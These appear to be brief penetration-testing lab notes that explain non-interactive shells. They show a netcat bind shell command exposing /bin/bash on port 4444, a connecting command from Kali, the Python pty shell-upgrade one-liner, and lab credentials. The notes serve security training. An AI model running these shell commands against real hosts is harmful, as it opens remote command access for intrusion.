Most net-cat like tools provide a "non-interactive" shell:
- Programs that require user input such as many file transfer programs, or su or sudo tend to work poorly or not at all. 

ls is an example of a non-interactive command, meaning it can complete with no user interaction.

Contract that with a typical FTP session:
We have to enter a uname and password, and can only exit with a "bye" command. 
This is an "interactive" program. 

### Upgrading a non-interactive shell

**pty**- A standard module in the Python Interpreter that allows creation of pseudo-terminals.

setup a nc connection between the two hosts:

Debian:
`nc -lvnp 4444 -e /bin/bash`

Kali:
`nc -vn 10.11.0.128 4444`
`python -c 'import pty; pty.spawn("/bin/bash")'`
`ftp 192.168.119.127`
`offsec:offsec`








